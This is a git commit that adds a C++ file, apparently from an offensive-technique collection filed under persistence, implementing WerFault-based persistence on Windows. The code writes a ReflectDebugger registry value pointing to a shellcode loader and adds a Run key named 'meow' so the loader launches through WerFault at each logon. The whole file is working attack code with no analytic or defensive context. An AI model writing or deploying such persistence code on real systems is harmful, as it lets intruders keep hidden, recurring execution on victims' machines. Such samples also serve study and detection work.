e1be41c21f6699d4ad12b4ccb25494d41789c2ce
BlueTrust <92355496+Sohrabian@users.noreply.github.com>
2025-05-12 14:39:42 +0330

    Create werfault.cpp

---
+++ TA0003 Persistence/werfault/werfault.cpp
@@ -0,0 +1,29 @@
+#include <windows.h>
+#include <string.h>
+
+int main(int argc, char* argv[]) {
+    HKEY hkey = NULL;
+
+    // malicious app - This shellCodeLoader is Detected with Defender
+    const wchar_t* exe = L"C:\\werfault-hack\\shellcodeloader.exe";
+
+    // hijacked app
+    const wchar_t* wf = L"WerFault.exe -pr 1";
+
+    // set evil app
+    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0, KEY_WRITE, &hkey);
+    if (res == ERROR_SUCCESS) {
+        // create new registry key
+        RegSetValueEx(hkey, L"ReflectDebugger", 0, REG_SZ, (const BYTE*)exe, (wcslen(exe) + 1) * sizeof(wchar_t));
+        RegCloseKey(hkey);
+    }
+
+    // startup
+    res = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
+    if (res == ERROR_SUCCESS) {
+        // create new registry key
+        RegSetValueEx(hkey, L"meow", 0, REG_SZ, (const BYTE*)wf, (wcslen(wf) + 1) * sizeof(wchar_t));
+        RegCloseKey(hkey);
+    }
+    return 0;
+}
